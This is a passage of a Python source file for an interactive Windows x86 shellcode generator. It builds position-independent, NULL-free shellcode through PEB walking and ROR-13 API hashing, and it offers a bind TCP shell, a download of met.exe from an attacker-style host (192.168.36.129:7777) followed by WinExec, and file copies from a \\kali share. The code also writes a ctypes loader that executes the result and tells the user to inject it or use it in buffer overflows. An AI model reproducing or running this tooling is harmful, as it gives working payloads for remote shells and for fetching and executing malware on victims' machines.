            # Write the array
            # Find the last code item index
            last_code_idx = None
            for i in range(len(code_lines) - 1, -1, -1):
                if code_lines[i][0] == 'code':
                    last_code_idx = i
                    break
            
            for i, (line_type, *content) in enumerate(code_lines):
                if line_type == 'empty':
                    if i > 0:
                        f.write('\n')
                elif line_type == 'comment':
                    # Write comment on separate line with # tag
                    comment_text = content[0]
                    if comment_text.startswith('##'):
                        # Has ##, convert to single #
                        comment_text = '#' + comment_text.lstrip('#')
                    elif comment_text.startswith('#'):
                        # Already has #, use as is
                        comment_text = comment_text
                    else:
                        # No #, add single #
                        comment_text = '# ' + comment_text
                    f.write(f'    {comment_text}\n')
                elif line_type == 'code':
                    code_text = content[0]
                    explanation = content[1] if len(content) > 1 else None
                    # Add comma unless it's the last code item
                    comma = '' if i == last_code_idx else ','
                    
                    if explanation:
                        f.write(f'    "{code_text}",  # {explanation}{comma}\n')
                    else:
                        f.write(f'    "{code_text}"{comma}\n')
            
            f.write("""
]
    code_str = "\\n".join(code)
    shellcode_ptr = asm2shell(code_str)
    
    if shellcode_ptr:
        # Execute the shellcode
        execute_shellcode(shellcode_ptr)
        
        # Cleanup (optional)
        ctypes.windll.kernel32.VirtualFree(
            ctypes.c_int(shellcode_ptr),
            ctypes.c_int(0),
            ctypes.c_int(0x8000)  # MEM_RELEASE
        )

if __name__ == "__main__":
    main()
""")




class ShellcodeApp:
    def __init__(self):
        self.generator = ShellcodeGenerator()
        self.selected_apis = []
        self.api_info = {
            '1': {'name': 'CopyFileA', 'dll': 'kernel32.dll', 
                  'desc': 'Copy file from source to destination',
                  'requires': ['Source path', 'Destination path', 'Fail if exists flag']},
            '2': {'name': 'CopyFileExA', 'dll': 'kernel32.dll',
                  'desc': 'Copy file with progress callback',
                  'requires': ['Source path', 'Destination path', 'Copy flags']},
            '3': {'name': 'CreateProcessA', 'dll': 'kernel32.dll',
                  'desc': 'Create new process',
                  'requires': ['Command line', 'Process parameters']},
            '4': {'name': 'GetUserNameA', 'dll': 'advapi32.dll',
                  'desc': 'Get current username',
                  'requires': ['Buffer size']},
            '5': {'name': 'GetUserProfileDirectoryA', 'dll': 'userenv.dll',
                  'desc': 'Get user profile directory',
                  'requires': ['Buffer size', 'User token (optional)']},
            '6': {'name': 'MoveFileA', 'dll': 'kernel32.dll',
                  'desc': 'Move/rename file',
                  'requires': ['Source path', 'Destination path']},
            '7': {'name': 'TerminateProcess', 'dll': 'kernel32.dll',
                  'desc': 'Terminate current process',
                  'requires': ['Exit code', 'Process handle']},
            '8': {'name': 'LoadLibraryA', 'dll': 'kernel32.dll',
                  'desc': 'Load DLL library',
                  'requires': ['DLL filename']},
            '9': {'name': 'Bind TCP Shell', 'dll': 'ws2_32.dll, kernel32.dll',
                  'desc': 'Open bind shell on specified port',
                  'requires': ['Port number', 'Process to spawn']},
            '10': {'name': 'SHGetFolderPathA (build path)', 'dll': 'shell32.dll, kernel32.dll',
                   'desc': 'Resolve CSIDL folder and append filename',
                   'requires': ['CSIDL target', 'Output filename']},
            '11': {'name': 'URLDownloadToFileA', 'dll': 'urlmon.dll, kernel32.dll',
                   'desc': 'Download HTTP URL to path from previous step',
                   'requires': ['HTTP URL']},
            '12': {'name': 'WinExec (execute path)', 'dll': 'kernel32.dll',
                   'desc': 'Execute downloaded file path from previous step',
                   'requires': ['(uses stored path)']}
        }
        self.done_choice = str(len(self.api_info) + 1)
    
    def print_header(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("╔" + "═" * 78 + "╗")
        print("║" + " " * 25 + "SHELLCODE GENERATOR" + " " * 25 + "║")
        print("╚" + "═" * 78 + "╝")
        print()
        print("  Key Features:")
        print("    √ API Hashing: ROR-13 algorithm for function name hashing")
        print("    √ NULL-Free: No NULL bytes in generated shellcode")
        print("    √ Dynamic Loading: APIs loaded at runtime via PEB walking")
        print("    √ Offset Management: Proper stack frame setup")
        print("    √ Multi-API Support: Chain multiple Windows API calls")
        print("    √ User-Friendly: Interactive CLI with explanations")
        print()
        print("  Note: All DLLs are loaded dynamically via PEB. No hardcoded addresses.")
        print("        Shellcode resolves APIs at runtime using hash-based lookups.")
        print()
        print("═" * 80)
        print()
    
    def print_menu(self):
        print("  Available Windows APIs:")
        print()
        for key in sorted(self.api_info.keys(), key=lambda x: int(x)):
            info = self.api_info[key]
            dll_str = f"({info['dll']})"
            print(f"    [{key}] {info['name']:25} {dll_str:20} - {info['desc']}")
        print()
        print(f"    [{self.done_choice}] DONE - Generate shellcode with selected APIs")
        print()
        print("─" * 80)
    
    def show_api_details(self, api_key):
        """Show detailed information about the selected API"""
        info = self.api_info.get(api_key)
        if not info:
            return
        
        print(f"\n  ┌─ {info['name']} Details ─{'─' * (70 - len(info['name']))}┐")
        print(f"  │ {'Description:':15} {info['desc']}")
        print(f"  │ {'Required DLL:':15} {info['dll']}")
        print(f"  │ {'Requirements:':15}")
        
        for req in info['requires']:
            print(f"  │ {'':17} • {req}")
        
        print(f"  │")
        print(f"  │ Note: This generator will:")
        print(f"  │       1. Dynamically load {info['dll']} via PEB")
        print(f"  │       2. Resolve {info['name']} using ROR-13 hash")
        print(f"  │       3. Generate position-independent shellcode")
        print(f"  └{'─' * 77}┘")
        print()
    
    def run(self):
        self.print_header()
        
        print("  [*] Generating base shellcode template...")
        self.generator.generate_base_shellcode()
        print("  [√] Base shellcode generated")
        print()
        
        while True:
            self.print_menu()
            max_api = max(int(k) for k in self.api_info.keys())
            
            if self.selected_apis:
                print("  Selected APIs:")
                for i, (api_name, details) in enumerate(self.selected_apis, 1):
                    print(f"    {i}. {api_name}")
                    if details:
                        print(f"       Parameters: {details}")
                print()
            
            choice = input(f"  Select API (1-{max_api}) or DONE ({self.done_choice}): ").strip()
            
            if choice == self.done_choice:
                if not self.selected_apis:
                    print("\n  [!] No APIs selected! Please select at least one API.")
                    input("  Press Enter to continue...")
                    self.print_header()
                    continue
                break
            
            if choice not in self.api_info:
                print(f"\n  [!] Invalid choice '{choice}'! Please select 1-{max_api} or {self.done_choice} to finish.")
                input("  Press Enter to continue...")
                self.print_header()
                continue
            
            # Show API details before configuration
            self.show_api_details(choice)
            
            # Configure API parameters
            config_methods = {
                '1': self._configure_copyfile,
                '2': self._configure_copyfileex,
                '3': self._configure_createprocess,
                '4': self._configure_getusername,
                '5': self._configure_getuserprofiledir,
                '6': self._configure_movefile,
                '7': self._configure_terminate,
                '8': self._configure_loadlibrary,
                '9': self._configure_bind_shell,
                '10': self._configure_shgetfolder_path,
                '11': self._configure_urldownload,
                '12': self._configure_winexec_path
            }
            
            config_method = config_methods.get(choice)
            if config_method:
                config_method()
            
            self.print_header()
        
        # Display results
        self._display_results()
    
    def _configure_copyfile(self):
        print("  ┌─ CopyFileA Configuration ───────────────────────────────────────────┐")
        print("  │ Required: Source path, Destination path, FailIfExists flag         │")
        print("  │ DLL: kernel32.dll                                                  │")
        print("  └────────────────────────────────────────────────────────────────────┘")
        print()
        
        source = input("  Source path [\\\\kali\\met\\]: ").strip() or "\\\\kali\\met\\"

        use_dynamic = input("  Use dynamic user path for destination? (y/n) [n]: ").strip().lower() != 'y'
        if use_dynamic:
            filename = input("  File after username [Desktop\\met.exe]: ").strip() or "Desktop\\met.exe"
            dest = None
            display_dest = f"C:\\Users\\{{user}}\\{filename}"
        else:
            dest = input("  Destination path [C:\\temp\\m.txt]: ").strip() or r"C:\temp\m.txt"
            filename = "met.exe"
            display_dest = dest

        fail = input("  Fail if destination exists? (y/n) [n]: ").strip().lower() == 'y'
        
        print()
        print("  [*] Generating shellcode for CopyFileA...")
        self.generator.generate_copyfile(source, dest, use_dynamic, filename, fail)
        
        details = f"src='{source}', dst='{display_dest}', fail_exists={fail}"
        self.selected_apis.append(("CopyFileA", details))
        
        print("  [√] CopyFileA shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_copyfileex(self):
        print("  ┌─ CopyFileExA Configuration ────────────────────────────────────────┐")
        print("  │ Required: Source path, Destination path, Copy flags               │")
        print("  │ DLL: kernel32.dll                                                  │")
        print("  │ Note: Supports progress callback and resume capabilities          │")
        print("  └────────────────────────────────────────────────────────────────────┘")
        print()
        
        source = input("  Source path [\\\\kali\\met\\met.exe]: ").strip() or r"\\kali\met\met.exe"
        
        use_dynamic = input("  Use dynamic user path? (y/n) [y]: ").strip().lower() or 'y'
        use_dynamic = use_dynamic != 'n'
        
        if use_dynamic:
            filename = input("  Path after username [Desktop\\met.exe]: ").strip() or "Desktop\\met.exe"
            dest = None
            display_dest = f"C:\\Users\\{{username}}\\{filename}"
        else:
            dest = input("  Destination path [C:\\temp\\met.exe]: ").strip() or r"C:\temp\met.exe"
            filename = None
            display_dest = dest
        
        print("\n  Copy Flags:")
        print("    0x00000001 - COPY_FILE_FAIL_IF_EXISTS")
        print("    0x00000002 - COPY_FILE_RESTARTABLE")
        print("    0x00000008 - COPY_FILE_OPEN_SOURCE_FOR_WRITE")
        print("    0x00000080 - COPY_FILE_ALLOW_DECRYPTED_DESTINATION")
        print()
        
        copy_flags_input = input("  Copy flags (hex or decimal) [0]: ").strip() or "0"
        try:
            if copy_flags_input.startswith('0x'):
                copy_flags = int(copy_flags_input, 16)
            elif 'x' in copy_flags_input.lower():
                copy_flags = int(copy_flags_input, 16)
            else:
                copy_flags = int(copy_flags_input)
        except:
            copy_flags = 0
        
        print()
        print("  [*] Generating shellcode for CopyFileExA...")
        self.generator.generate_copyfileex(source, dest, use_dynamic_path=use_dynamic, 
                                          filename=filename if use_dynamic else None, 
                                          copy_flags=copy_flags)
        
        details = f"src='{source}', dst='{display_dest}', flags=0x{copy_flags:08x}"
        self.selected_apis.append(("CopyFileExA", details))
        
        print("  [√] CopyFileExA shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_createprocess(self):
        print("  ┌─ CreateProcessA Configuration ─────────────────────────────────────┐")
        print("  │ Required: Command line or application path                        │")
        print("  │ DLL: kernel32.dll                                                  │")
        print("  │ Note: Can spawn new process with specified parameters             │")
        print("  └────────────────────────────────────────────────────────────────────┘")
        print()
        
        use_dynamic = input("  Use dynamic user path? (y/n) [y]: ").strip().lower() or 'y'
        use_dynamic = use_dynamic != 'n'
        
        if use_dynamic:
            filename = input("  Path after username [Desktop\\met.exe]: ").strip() or "Desktop\\met.exe"
            cmd = None
            display_cmd = f"C:\\Users\\{{username}}\\{filename}"
        else:
            cmd = input("  Command to execute [cmd.exe]: ").strip() or "cmd.exe"
            filename = None
            display_cmd = cmd
        
        print()
        print("  [*] Generating shellcode for CreateProcessA...")
        self.generator.generate_createprocess(cmd, use_dynamic_path=use_dynamic, 
                                            filename=filename if use_dynamic else None)
        
        details = f"cmd='{display_cmd}'"
        self.selected_apis.append(("CreateProcessA", details))
        
        print("  [√] CreateProcessA shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_getusername(self):
        print("  ┌─ GetUserNameA Configuration ───────────────────────────────────────┐")
        print("  │ Required: Buffer size                                              │")
        print("  │ DLL: advapi32.dll                                                  │")
        print("  │ Note: Retrieves name of current user                               │")
        print("  └────────────────────────────────────────────────────────────────────┘")
        print()
        
        size = input("  Buffer size (in bytes) [256]: ").strip()
        size = int(size) if size else 256
        
        print()
        print("  [*] Generating shellcode for GetUserNameA...")
        self.generator.generate_getusername(size)
        
        details = f"buffer_size={size}"
        self.selected_apis.append(("GetUserNameA", details))
        
        print("  [√] GetUserNameA shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_getuserprofiledir(self):
        print("  ┌─ GetUserProfileDirectoryA Configuration ──────────────────────────┐")
        print("  │ Required: Buffer size                                             │")
        print("  │ DLL: userenv.dll                                                  │")
        print("  │ Note: Gets path to user's profile directory                       │")
        print("  └───────────────────────────────────────────────────────────────────┘")
        print()
        
        size = input("  Buffer size (in bytes) [256]: ").strip()
        size = int(size) if size else 256
        
        print()
        print("  [*] Generating shellcode for GetUserProfileDirectoryA...")
        self.generator.generate_getuserprofiledir(size)
        
        details = f"buffer_size={size}"
        self.selected_apis.append(("GetUserProfileDirectoryA", details))
        
        print("  [√] GetUserProfileDirectoryA shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_movefile(self):
        print("  ┌─ MoveFileA Configuration ─────────────────────────────────────────┐")
        print("  │ Required: Source path, Destination path                           │")
        print("  │ DLL: kernel32.dll                                                 │")
        print("  │ Note: Can also be used to rename files                            │")
        print("  └───────────────────────────────────────────────────────────────────┘")
        print()
        
        source = input("  Source path [\\\\kali\\met\\]: ").strip() or "\\\\kali\\met\\"
        
        use_dynamic = input("  Use dynamic user path for destination? (y/n) [y]: ").strip().lower() or 'y'
        use_dynamic = use_dynamic != 'n'
        
        if use_dynamic:
            filename = input("  Path after username [Desktop\\met.exe]: ").strip() or "Desktop\\met.exe"
            dest = None
            display_dest = f"C:\\Users\\{{user}}\\{filename}"
        else:
            dest = input("  Destination path [C:\\new.txt]: ").strip() or r"C:\new.txt"
            filename = "met.exe"
            display_dest = dest
        
        print()
        print("  [*] Generating shellcode for MoveFileA...")
        self.generator.generate_movefile(source, dest, use_dynamic_path=use_dynamic, filename=filename)
        
        details = f"src='{source}', dst='{display_dest}'"
        self.selected_apis.append(("MoveFileA", details))
        
        print("  [√] MoveFileA shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_terminate(self):
        print("  ┌─ TerminateProcess Configuration ──────────────────────────────────┐")
        print("  │ Required: Exit code, Process handle                               │")
        print("  │ DLL: kernel32.dll                                                 │")
        print("  │ Note: Terminates current process by default                       │")
        print("  └───────────────────────────────────────────────────────────────────┘")
        print()
        
        code = input("  Exit code [0]: ").strip()
        code = int(code) if code else 0
        
        print()
        print("  [*] Generating shellcode for TerminateProcess...")
        self.generator.generate_terminate(code)
        
        details = f"exit_code={code}"
        self.selected_apis.append(("TerminateProcess", details))
        
        print("  [√] TerminateProcess shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_loadlibrary(self):
        print("  ┌─ LoadLibraryA Configuration ──────────────────────────────────────┐")
        print("  │ Required: DLL filename                                            │")
        print("  │ DLL: kernel32.dll (to load other DLLs)                            │")
        print("  │ Note: Loads additional DLLs for extended functionality            │")
        print("  └───────────────────────────────────────────────────────────────────┘")
        print()
        
        dll = input("  DLL name to load [ws2_32.dll]: ").strip() or "ws2_32.dll"
        
        print()
        print("  [*] Generating shellcode for LoadLibraryA...")
        self.generator.generate_loadlibrary(dll)
        
        details = f"dll='{dll}'"
        self.selected_apis.append(("LoadLibraryA", details))
        
        print("  [√] LoadLibraryA shellcode added")
        input("  Press Enter to continue...")
    
    def _configure_bind_shell(self):
        print("  ┌─ Bind TCP Shell Configuration ───────────────────────────────────┐")
        print("  │ Required: Port number, Process to spawn                          │")
        print("  │ DLL: ws2_32.dll (Winsock), kernel32.dll (CreateProcess)          │")
        print("  │ Note: Creates bind shell on specified port                       │")
        print("  └──────────────────────────────────────────────────────────────────┘")
        print()
        
        port_input = input("  Port number [4444]: ").strip() or "4444"
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                print("  [!] Invalid port! Using 4444")
                port = 4444
        except:
            print("  [!] Invalid port! Using 4444")
            port = 4444
        
        process = input("  Process to spawn [cmd.exe]: ").strip() or "cmd.exe"
        
        print()
        print("  [*] Generating shellcode for Bind TCP Shell...")
        print("  [*] This will load ws2_32.dll and kernel32.dll dynamically")
        self.generator.generate_bind_shell(port=port, spawn_process=process)
        
        details = f"port={port}, process='{process}'"
        self.selected_apis.append(("Bind TCP Shell", details))
        
        print("  [√] Bind TCP Shell shellcode added")
        input("  Press Enter to continue...")

    def _configure_shgetfolder_path(self):
        print("  ┌ SHGetFolderPathA (build path) ┐")
        print("  │ Resolves CSIDL folder, appends filename, stores pointer at [ebp-0x30] │")
        print("  └" + "─" * 70 + "┘")
        print()
        csidl_raw = input("  CSIDL target [desktop]: ").strip().lower() or "desktop"
        if csidl_raw in CSIDL_MAP:
            csidl_value = CSIDL_MAP[csidl_raw]
            csidl_display = csidl_raw
        else:
            try:
                csidl_value = int(csidl_raw, 0)
                csidl_display = hex(csidl_value)
            except ValueError:
                print("  [!] Invalid CSIDL, using desktop")
                csidl_value = CSIDL_MAP["desktop"]
                csidl_display = "desktop"
        filename = input("  Filename to append [met.exe]: ").strip() or "met.exe"
        print("\n  [*] Generating SHGetFolderPathA path builder...")
        self.generator.generate_path_with_shgetfolder(csidl=csidl_value, filename=filename)
        details = f"csidl={csidl_display}, filename='{filename}'"
        self.selected_apis.append(("SHGetFolderPathA path", details))
        print("  [√] Path builder shellcode added")
        input("  Press Enter to continue...")

    def _configure_urldownload(self):
        print("  ┌ URLDownloadToFileA ┐")
        print("  │ Downloads HTTP URL to path stored at [ebp-0x30]                │")
        print("  │ Tip: run SHGetFolderPathA option first to set the path          │")
        print("  └" + "─" * 66 + "┘")
        print()
        default_url = "http://192.168.36.129:7777/met.exe"
        url = input(f"  HTTP URL [{default_url}]: ").strip() or default_url

        last_seg = url.rsplit('/', 1)[-1]
        derived = last_seg if '.' in last_seg else "met.exe"

        print("\n  [*] Generating URLDownloadToFileA shellcode...")
        self.generator.generate_download_to_stored_path(url)
        details = f"url='{url}', dest=[ebp-0x30] (e.g. ...\\{derived})"
        self.selected_apis.append(("URLDownloadToFileA", details))
        print("  [√] URLDownloadToFileA shellcode added")
        input("  Press Enter to continue...")

    def _configure_winexec_path(self):
        print("  ┌ WinExec (execute stored path) ┐")
        print("  │ Executes path saved at [ebp-0x30]; run SHGetFolderPathA first   │")
        print("  └" + "─" * 68 + "┘")
        print()
        print("  [*] Generating WinExec shellcode...")
        self.generator.generate_winexec_stored_path()
        details = "lpCmdLine=[ebp-0x30], SW_SHOWNORMAL"
        self.selected_apis.append(("WinExec", details))
        print("  [√] WinExec shellcode added")
        input("  Press Enter to continue...")

    def _null_offsets(self, data: bytes):
        return [i for i, b in enumerate(data) if b == 0x00]

    def _hexdump_line(self, data: bytes, base: int, width: int = 16):
        chunk = data[base:base+width]
        hex_bytes = " ".join(f"{b:02x}" for b in chunk)
        ascii_bytes = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        return hex_bytes, ascii_bytes

    def _print_null_report(self, data: bytes, label="shellcode", ctx: int = 8, width: int = 16, max_show: int = 10):
        offs = self._null_offsets(data)

        print(f"  [{label}] bytes={len(data)}  nulls={len(offs)}")

        if not offs:
            print("[+] No NULL bytes found")
            return 0

        print("[x] NULL BYTES FOUND!")
        show_list = offs[:max_show]
        if len(offs) > max_show:
            print(f"  Showing first {max_show} of {len(offs)} NULLs...")

        for idx, off in enumerate(show_list, 1):
            start = max(0, off - ctx)
            end   = min(len(data), off + ctx + 1)

            line_base = (off // width) * width
            hex_line, ascii_line = self._hexdump_line(data, line_base, width=width)


            pointer_pos = (off - line_base) * 3
            pointer_line = " " * pointer_pos + "^^"

            before = data[off-1] if off-1 >= 0 else None
            after  = data[off+1] if off+1 < len(data) else None

            print(f"\n  #{idx} NULL at offset {off} (0x{off:08x})")
            if before is not None:
                print(f"     prev byte: 0x{before:02x}")
            if after is not None:
                print(f"     next byte: 0x{after:02x}")

            ctx_hex = " ".join(f"{b:02x}" for b in data[start:end])
            print(f"     context [{start}:{end}] => {ctx_hex}")

            print(f"     {line_base:08x}: {hex_line}")
            print(f"              {pointer_line}")
            print(f"              {ascii_line}")

        print("\n  [!] Fix: avoid generating 00 bytes (immediates, displacements, push 0, mov reg,0 etc.)")
        return len(offs)

    
    def _display_results(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("╔" + "═" * 78 + "╗")
        print("║" + " " * 28 + "RESULTS" + " " * 44 + "║")
        print("╚" + "═" * 78 + "╝")
        print()
        
        print("  Generated Shellcode Summary:")
        print("  " + "─" * 78)
        print("  Selected APIs and Parameters:")
        for i, (api_name, details) in enumerate(self.selected_apis, 1):
            print(f"    {i:2}. {api_name}")
            if details:
                print(f"         {details}")
        print()
        
        dlls_required = set()
        for api_name, _ in self.selected_apis:
            for info in self.api_info.values():
                if info['name'] == api_name:
                    for dll in info['dll'].split(', '):
                        dlls_required.add(dll)
        
        print("  DLLs to be loaded dynamically:")
        for dll in sorted(dlls_required):
            print(f"    • {dll}")
        print()
        
        print("  " + "═" * 78)
        print("  GENERATED SHELLCODE (with explanations):")
        print("  " + "═" * 78)
        print()
        print('  # Start shellcode generation')
        print('  shellcode = b""')
        print()
        # shellcode = self.generator.get_raw_shellcode()
        # if shellcode:
        #     print(f'  shellcode += {shellcode}')
        # else:
        #     print("  [!] Failed to generate shellcode")
        #     return
        
        # Get shellcode lines with explanations
        c = []
        code_lines = self.generator.get_code_with_explanations()
        for line in code_lines:
            if isinstance(line, tuple):
                asm, explanation = line
                if explanation:
                    print(f'  shellcode += "{asm}"  # {explanation}')
                    c.append(asm)
                else:
                    print(f'  shellcode += "{asm}"')
                    c.append(asm)
            elif line.startswith('#'):
                print(f'  {line}')
                c.append(line)
            else:
                print(f'  shellcode += "{line}"')
                c.append(line)
            
        ks = Ks(KS_ARCH_X86, KS_MODE_32)
        shell = []
        for i in c:
            if "#" in i:
                continue
            shell.append(i)
        try:
            encoding, count = ks.asm("\n".join(shell))
        except KsError as e:
            print(f"Assembly error: {e}")
            return None
        
        shellcode_bytes = b""
        shellcode_string = ""
        
        for byte in encoding:
            shellcode_bytes += struct.pack("B", byte)
            shellcode_string += f"\\x{byte:02x}"

        print(f"  Total shellcode size: {count} bytes")
        nulls = self._print_null_report(shellcode_bytes, label="keystone output", ctx=8, width=16)
        if nulls > 0:
            print("  [!] NULL bytes detected -> fix your assembly / encoding.")
            return None
        print(f"  NULL bytes: {nulls} (all avoided)")
        print()
        
        print()
        print("  " + "═" * 80)
        
        # Show function offsets if available
        if hasattr(self.generator, 'functions_added') and self.generator.functions_added:
            print("  FUNCTION OFFSETS IN SHELLCODE:")
            print("  " + "─" * 80)
            for func_name, offset in self.generator.functions_added:
                print(f"    {func_name:35} → [EBP + {hex(offset)}]")
            print("  " + "─" * 80)
            print()
        
        
        

        save = input("  Save to Python file? (y/n): ").strip().lower()
        if save == 'y':
            filename = input("  Filename [shellcode.py]: ").strip() or "shellcode.py"
            self.generator.save_to_file(filename, with_explanations=True)
            print(f"\n  [√] Shellcode saved to '{filename}'")
            print(f"  [*] File includes detailed comments for each instruction")
            
            # Show usage example
            print(f"\n  Usage example:")
            print(f"    1. python {filename}")
            print(f"    2. Copy the shellcode bytes")
            print(f"    3. Use in your exploit/PoC")
        else:
            print("\n  [*] Shellcode displayed above (not saved to file)")
            print("  [*] Copy the shellcode bytes above for use in your exploit")
        
        print("\n" + "═" * 80)
        print("  Note: This shellcode:")
        print("    • Uses dynamic DLL loading via PEB (Process Environment Block)")
        print("    • Resolves APIs using ROR-13 hash algorithm")
        print("    • Is position-independent and NULL-byte free")
        print("    • Can be injected into processes or used in buffer overflows")
        print("═" * 80)

def main():
    try:
        app = ShellcodeApp()
        app.run()
    except KeyboardInterrupt:
        print("\n\n  [!] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n  [ERROR] {e}")
        print("  [*] Please ensure all dependencies are installed")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()

